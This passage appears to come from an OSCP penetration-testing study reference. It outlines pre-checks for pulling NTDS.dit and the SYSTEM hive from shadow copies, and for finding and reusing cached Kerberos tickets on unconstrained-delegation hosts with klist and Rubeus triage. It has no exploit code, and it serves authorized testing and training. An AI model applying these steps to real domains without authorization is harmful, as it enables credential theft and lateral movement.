- **Validate:** establish platform, exact volume, existing-versus-new snapshot, read rights, matched `NTDS.dit` and SYSTEM-hive requirement, output destination and cleanup authority.
- **Execute:** [shadow-copy boundary checks](https://armaanleg3nd.github.io/oscp/reference/06-ad-lateral-movement/02-credential-access/#shadow-copy-boundary-inspect-before-creating-anything). Creating/exposing/deleting a shadow and acquiring the matched files remain unavailable until RW08 is complete.
- **Verify:** listing proves only snapshot metadata. Credential acquisition requires readable, point-in-time-compatible NTDS/SYSTEM material and successful offline parsing.
- **Outcomes:** suitable existing snapshot and read path identified → ready for RW08 procedure; platform/rights/volume/source decisively incompatible → ruled out here; snapshot listed but access/freshness/matching hive unresolved → inconclusive.
- **Source:** [Microsoft DiskShadow](https://learn.microsoft.com/windows-server/administration/windows-commands/diskshadow).

### Follow the evidence

## S19

### Separate an unconstrained-delegation flag from tickets actually present

**Enter:** a computer/service account has TrustedForDelegation/unconstrained delegation and the selected host/session context is accessible.

**Discovery**

```text

```

**Interpret:** confirm the account/SPNs and inspect the actual selected ticket cache with klist or Rubeus.exe triage in the permitted context.

**Still check:** ticket owner, realm, service/TGT type, validity, logon-session/LUID access, export/cache compatibility and the exact receiving service. A delegation flag without a cached client ticket is only configuration.

**Verify:** prove one named service action under the ticket principal, then preserve the host/LUID/cache scope. Do not record a password, hash or domain-wide privilege.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions/)

### Full procedure and variants

- **Enter:** a computer/service account has `TrustedForDelegation`/unconstrained delegation and the selected host/session context is accessible.
- **Discover:** confirm the account/SPNs and inspect the actual selected ticket cache with `klist` or `Rubeus.exe triage` in the permitted context.
- **Validate:** ticket owner, realm, service/TGT type, validity, logon-session/LUID access, export/cache compatibility and the exact receiving service. A delegation flag without a cached client ticket is only configuration.
- **Execute:** when a relevant ticket already exists, use the [ticket classification and cache procedure](https://armaanleg3nd.github.io/oscp/reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions/) and [movement preflight](https://armaanleg3nd.github.io/oscp/reference/06-ad-lateral-movement/05-lateral-movement/#2-preflight-from-the-actual-source). Forced/coerced authentication remains unavailable under RW11.
- **Verify:** prove one named service action under the ticket principal, then preserve the host/LUID/cache scope. Do not record a password, hash or domain-wide privilege.
- **Outcomes:** usable cached ticket accepted by the named service → D28/D29; no relevant ticket in the inspectable context → current cached-ticket path ruled out; inaccessible LUID, stale ticket or ambiguous principal → inconclusive.

### Follow the evidence

